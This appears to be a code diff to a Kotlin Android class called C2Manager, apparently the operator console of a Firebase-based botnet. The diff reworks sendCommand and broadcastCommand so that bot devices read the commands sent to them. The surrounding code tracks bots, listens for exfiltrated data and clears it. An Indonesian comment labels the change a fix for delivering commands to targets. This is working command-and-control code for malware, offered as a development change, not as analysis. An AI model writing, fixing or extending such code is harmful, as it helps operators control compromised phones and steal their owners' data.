@@ -79,8 +79,7 @@ object C2Manager {
     fun onConnectionError(callback: (String) -> Unit) { _onConnectionError = callback }
 
     fun initialize() {
-        if (::database.isInitialized) return 
-
+        if (::database.isInitialized) return
         try {
             database = FirebaseDatabase.getInstance(FIREBASE_URL)
             database.setPersistenceEnabled(true)
@@ -122,7 +121,9 @@ object C2Manager {
                 val bot = snapshot.getValue(BotInfo::class.java) ?: return
                 _onBotUpdate?.invoke(snapshot.key ?: "", bot)
             }
-            override fun onChildRemoved(snapshot: DataSnapshot) { _onBotDisconnected?.invoke(snapshot.key ?: "") }
+            override fun onChildRemoved(snapshot: DataSnapshot) {
+                _onBotDisconnected?.invoke(snapshot.key ?: "")
+            }
             override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
             override fun onCancelled(error: DatabaseError) {}
         })
@@ -167,23 +168,39 @@ object C2Manager {
         exfilRef.addValueEventListener(exfilListener!!)
     }
 
+    // ==================== 🔥 FIX: TAMBAH KEY "target" BIAR DIBACA TARGET ====================
+
     fun sendCommand(botId: String, type: String, payload: String = "") {
         val cmdId = commandsRef.push().key ?: return
-        val cmd = C2Command(cmdId, type, payload, System.currentTimeMillis(), "pending")
+        val cmd = mapOf(
+            "cmdId" to cmdId,
+            "type" to type,
+            "payload" to payload,
+            "target" to botId,
+            "timestamp" to System.currentTimeMillis(),
+            "status" to "pending"
+        )
         commandsRef.child(cmdId).setValue(cmd)
     }
 
-    // --- FUNGSI YANG TADI HILANG ---
     fun broadcastCommand(type: String, payload: String = "") {
         val cmdId = broadcastRef.push().key ?: return
-        val cmd = C2Command(cmdId, type, payload, System.currentTimeMillis(), "broadcast")
+        val cmd = mapOf(
+            "cmdId" to cmdId,
+            "type" to type,
+            "payload" to payload,
+            "target" to "",
+            "timestamp" to System.currentTimeMillis(),
+            "status" to "broadcast"
+        )
         broadcastRef.child(cmdId).setValue(cmd)
     }
+
+    // ======================================================================================
 
     fun clearExfiltratedData() {
         exfilRef.removeValue()
     }
-    // --------------------------------
 
     fun removeBot(deviceId: String) {
         botsRef.child(deviceId).removeValue()
@@ -195,7 +212,9 @@ object C2Manager {
         botsRef.get().addOnSuccessListener { snapshot ->
             val bots = mutableMapOf<String, BotInfo>()
             for (child in snapshot.children) {
-                child.getValue(BotInfo::class.java)?.let { bots[child.key ?: ""] = it }
+                child.getValue(BotInfo::class.java)?.let {
+                    bots[child.key ?: ""] = it
+                }
             }
             callback(bots)
         }
